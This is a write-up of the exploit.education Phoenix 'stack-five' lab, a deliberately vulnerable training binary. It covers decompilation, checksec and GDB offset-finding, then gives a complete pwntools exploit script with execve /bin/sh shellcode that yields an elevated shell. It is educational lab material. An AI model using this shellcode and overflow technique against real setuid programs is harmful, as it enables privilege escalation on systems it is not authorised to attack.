# &#35; stack-5

#### &#42; pseudocode using ghidra
```bash

undefined4 main(void)

{
  puts("Welcome to phoenix/stack-five, brought to you by https://exploit.education");
  start_level();
  return 0;
}

void start_level(void)

{
  char local_8c [136];
  
  gets(local_8c);
  return;
}

```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/stack-five
/opt/phoenix/i486/stack-five: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/stack-five
[*] '/opt/phoenix/i486/stack-five'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'
```


#### &#42; how it work
#### buffer overflow on gets()
```bash
$ /opt/phoenix/i486/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
aaaa
$

```


#### &#42; vulnerable point
```bash
#### we can overwrite local_8c variable using gets(local_8c);
```


#### &#42; stack structure
#### local_8c[136] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/stack-five -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/stack-five...(no debugging symbols found)...done.

gef> x/4xw $ebp-0x4c        => local_50 [76]
0xffffd67c:	0x41414141	0x41414141	0x41414141	0x41414141
gef> x/4xw $ebp+0x4         => unaff_retaddr
0xffffd6cc:	0x42424242	0x00000000	0xffffd6f0	0xffffd76c
gef>


gef> x/32xw 0xffffd67c
0xffffd67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6ac:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6cc:	0x42424242	0x00000000	0xffffd6f0	0xffffd76c
0xffffd6dc:	0xf7f8f654	0xffffd764	0x00000001	0xffffd76c
0xffffd6ec:	0xf7f8f654	0x00000001	0xffffd764	0xffffd76c
gef>

gef> r < <(python -c 'print("A"*136+"BBBB"+"CCCC")')
.
.
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x43434343
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
[#0] Id 1, Name: "stack-five", stopped, reason: SIGSEGV
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
gef>


gef> disas start_level
Dump of assembler code for function start_level:
   0x08048485 <+0>:	push   ebp
   0x08048486 <+1>:	mov    ebp,esp
   0x08048488 <+3>:	sub    esp,0x88
   0x0804848e <+9>:	sub    esp,0xc
   0x08048491 <+12>:	lea    eax,[ebp-0x88]
   0x08048497 <+18>:	push   eax
   0x08048498 <+19>:	call   0x80482c0 <gets@plt>
   0x0804849d <+24>:	add    esp,0x10
   0x080484a0 <+27>:	nop
   0x080484a1 <+28>:	leave
   0x080484a2 <+29>:	ret
End of assembler dump.
gef> b *0x08048498
Breakpoint 1 at 0x8048498
gef> r < <(python -c 'print("A"*136+"BBBB"+"CCCC")')
.
.
gef> x/48xw $ebp-0x88       => local_8c
0xffffd640:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd690:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x42424242	0x43434343
0xffffd6d0:	0x00000000	0xffffd6f0	0xffffd76c	0xf7f8f654
0xffffd6e0:	0xffffd764	0x00000001	0xffffd76c	0xf7f8f654
0xffffd6f0:	0x00000001	0xffffd764	0xffffd76c	0x00000008
gef>


```

#### &#42; payload
```bash
#### local_8c[136] + sfp[4] + ret[4]
payload  = b""
payload += b"\x90"*100
payload += shellcode
payload += b"A"*13
payload += b"B"*4
payload += p32(0xffffd690)
print(len(payload))
```

#### &#42; exploit code
```bash
$ cat exp_stack5.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/stack-five"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
print(len(shellcode))

payload  = b""
payload += b"\x90"*100
payload += shellcode
payload += b"A"*13
payload += b"B"*4
payload += p32(0xffffd690)
print(len(payload))

conn = process(filename)
print( conn.recvline() )
conn.send(payload)

with open("payload", "wb") as fd:
    fd.write(payload)

conn.interactive()



$ python exp_stack5.py
23
144
[+] Starting local process '/opt/phoenix/i486/stack-five': pid 1466
Welcome to phoenix/stack-five, brought to you by https://exploit.education

[*] Switching to interactive mode
$
$
$ id
uid=1000(user) gid=1000(user) euid=505(phoenix-i386-stack-five) egid=505(phoenix-i386-stack-five) groups=505(phoenix-i386-stack-five),27(sudo),1000(user)
$
```


